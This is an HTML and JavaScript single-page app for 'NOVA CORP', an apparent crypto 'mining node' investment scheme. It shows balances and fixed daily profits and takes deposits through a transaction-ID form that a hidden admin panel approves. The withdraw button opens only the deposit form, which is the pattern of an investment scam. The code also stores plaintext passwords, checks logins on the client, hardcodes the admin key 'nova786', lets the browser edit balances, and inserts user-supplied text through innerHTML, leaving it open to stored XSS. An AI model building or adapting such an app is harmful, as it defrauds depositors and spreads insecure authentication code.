<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | PRO</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #D4AF37; }
        body { background: #ffffff; font-family: 'Inter', sans-serif; margin: 0; }
        .screen { display: none; min-height: 100vh; width: 100%; }
        .active-screen { display: block !important; }
        .glass-card { background: rgba(255, 255, 255, 0.8); backdrop-filter: blur(10px); border: 1px solid #f1f5f9; border-radius: 20px; transition: 0.3s; }
        .btn-main { background: var(--gold); color: white; border-radius: 12px; font-weight: 700; }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #eee; display: flex; justify-content: space-around; padding: 12px; z-index: 1000; }
    </style>
</head>
<body>

    <div id="auth-screen" class="screen active-screen flex flex-col justify-center items-center p-8">
        <h1 class="text-4xl font-black mb-8 italic">NO<span class="text-[#D4AF37]">VA</span></h1>
        <div class="w-full max-w-xs space-y-3">
            <input type="text" id="u-id" placeholder="Username" class="w-full p-4 bg-slate-50 rounded-xl border-none outline-none">
            <input type="password" id="u-pw" placeholder="Password" class="w-full p-4 bg-slate-50 rounded-xl border-none outline-none">
            <button onclick="handleAuth()" class="w-full btn-main py-4 uppercase text-xs tracking-widest">Login / Join</button>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center sticky top-0 bg-white/90 z-50">
            <h2 id="admin-trigger" class="font-black text-xl italic">NOVA</h2>
            <span id="display-name" class="text-[10px] font-bold bg-slate-100 px-3 py-1 rounded-full text-slate-500 uppercase">User</span>
        </header>

        <div id="scr-dash" class="screen active-screen px-4 pb-24">
            <div class="bg-slate-900 rounded-[24px] p-6 text-white mb-6 shadow-xl">
                <p class="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Available Balance</p>
                <h1 id="user-bal" class="text-4xl font-black mt-2 mb-6">$0.00</h1>
                <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-4">
                    <div><p class="text-[8px] text-slate-400 font-bold uppercase">Today</p><p id="user-daily" class="text-green-400 font-bold">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] text-slate-400 font-bold uppercase">Profit</p><p id="user-total" class="text-[#D4AF37] font-bold">$0.00</p></div>
                </div>
            </div>
            
            <div class="grid grid-cols-2 gap-3">
                <button onclick="openModal('dep-modal')" class="glass-card p-4 text-center font-bold text-xs"><i class="fa-solid fa-plus block mb-2 text-green-500"></i> DEPOSIT</button>
                <button onclick="openModal('dep-modal')" class="glass-card p-4 text-center font-bold text-xs"><i class="fa-solid fa-wallet block mb-2 text-red-500"></i> WITHDRAW</button>
            </div>
        </div>

        <div id="scr-nodes" class="screen px-4 pb-24">
            <h3 class="font-black text-lg mb-4">Mining Nodes (21)</h3>
            <div id="nodes-list" class="space-y-3"></div>
        </div>

        <div id="scr-admin" class="screen px-4 pb-24">
            <h3 class="font-black text-lg mb-4 text-red-600">Pending Approvals</h3>
            <div id="admin-list" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <button onclick="changeScreen('scr-dash')" class="text-[10px] font-bold"><i class="fa-solid fa-home block text-lg"></i></button>
            <button onclick="changeScreen('scr-nodes')" class="text-[10px] font-bold"><i class="fa-solid fa-server block text-lg"></i></button>
            <button id="admin-nav" onclick="changeScreen('scr-admin')" class="hidden text-red-600"><i class="fa-solid fa-lock block text-lg"></i></button>
        </nav>
    </div>

    <div id="dep-modal" class="fixed inset-0 bg-white z-[2000] p-6 hidden">
        <div class="flex justify-between items-center mb-6">
            <h2 class="font-black">Submit Request</h2>
            <button onclick="closeModal('dep-modal')" class="text-xl">&times;</button>
        </div>
        <input type="number" id="req-amt" placeholder="Amount" class="w-full p-4 bg-slate-100 rounded-xl mb-4 border-none outline-none">
        <input type="text" id="req-id" placeholder="Transaction ID" class="w-full p-4 bg-slate-100 rounded-xl mb-4 border-none outline-none">
        <button onclick="submitRequest()" class="w-full btn-main py-4">SUBMIT</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, collection, addDoc, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const config = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };

        const fb = initializeApp(config);
        const db = getFirestore(fb);
        let user = localStorage.getItem('nova_session');
        let taps = 0;

        // AUTH
        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return;
            const ref = doc(db, "users", id);
            const snap = await getDoc(ref);
            if(snap.exists()) {
                if(snap.data().password === pw) { localStorage.setItem('nova_session', id); location.reload(); }
                else alert("Wrong PW");
            } else {
                await setDoc(ref, { password: pw, balance: 0, daily: 0, total_profit: 0, nodes: [] });
                localStorage.setItem('nova_session', id); location.reload();
            }
        };

        // UI
        window.changeScreen = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
        };

        if(user) {
            document.getElementById('auth-screen').classList.remove('active-screen');
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('display-name').innerText = user;

            onSnapshot(doc(db, "users", user), (d) => {
                const data = d.data();
                document.getElementById('user-bal').innerText = `$${data.balance.toFixed(2)}`;
                document.getElementById('user-daily').innerText = `+$${data.daily.toFixed(2)}`;
                document.getElementById('user-total').innerText = `$${data.total_profit.toFixed(2)}`;
                renderNodes(data.nodes || []);
            });
        }

        function renderNodes(owned) {
            const list = document.getElementById('nodes-list');
            list.innerHTML = '';
            for(let i=1; i<=21; i++){
                const price = i * 45;
                const profit = i * 1.5;
                const isBought = owned.includes(i);
                list.innerHTML += `
                    <div class="glass-card p-4 flex justify-between items-center">
                        <div><p class="font-black text-xs">NODE V${i}</p><p class="text-[9px] text-slate-400">Profit: $${profit}/day</p></div>
                        <button onclick="${isBought ? '' : `buyNode(${i},${price},${profit})`}" class="px-4 py-2 rounded-lg text-[9px] font-black ${isBought ? 'bg-green-100 text-green-600' : 'bg-slate-900 text-white'}">
                            ${isBought ? 'ACTIVE' : 'BUY $'+price}
                        </button>
                    </div>`;
            }
        }

        window.buyNode = async (i, p, pr) => {
            const ref = doc(db, "users", user);
            const s = await getDoc(ref);
            if(s.data().balance < p) return alert("No Money");
            await updateDoc(ref, { balance: s.data().balance - p, nodes: [...s.data().nodes, i], daily: s.data().daily + pr });
        };

        // ADMIN TRIGGER
        document.getElementById('admin-trigger').onclick = () => {
            taps++;
            if(taps >= 4) {
                if(prompt("Admin Key:") === "nova786") {
                    document.getElementById('admin-nav').classList.remove('hidden');
                    loadAdmin();
                }
                taps = 0;
            }
        };

        function loadAdmin() {
            onSnapshot(query(collection(db, "requests"), where("status","==","Pending")), s => {
                const al = document.getElementById('admin-list');
                al.innerHTML = '';
                s.forEach(docReq => {
                    const r = docReq.data();
                    al.innerHTML += `<div class="glass-card p-4">
                        <p class="text-[10px] font-bold">@${r.user} | $${r.amt}</p>
                        <p class="text-[8px] text-slate-400 mb-3">${r.txid}</p>
                        <button onclick="approve('${docReq.id}', '${r.user}', ${r.amt})" class="bg-black text-white px-4 py-2 rounded text-[10px]">APPROVE</button>
                    </div>`;
                });
            });
        }

        window.approve = async (rid, uid, amt) => {
            const uref = doc(db, "users", uid);
            const us = await getDoc(uref);
            await updateDoc(uref, { balance: us.data().balance + amt });
            await updateDoc(doc(db, "requests", rid), { status: "Done" });
        };

        window.submitRequest = async () => {
            const amt = parseFloat(document.getElementById('req-amt').value);
            const txid = document.getElementById('req-id').value;
            await addDoc(collection(db, "requests"), { user, amt, txid, status: "Pending" });
            alert("Sent!"); closeModal('dep-modal');
        };

        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
    </script>
</body>
</html>
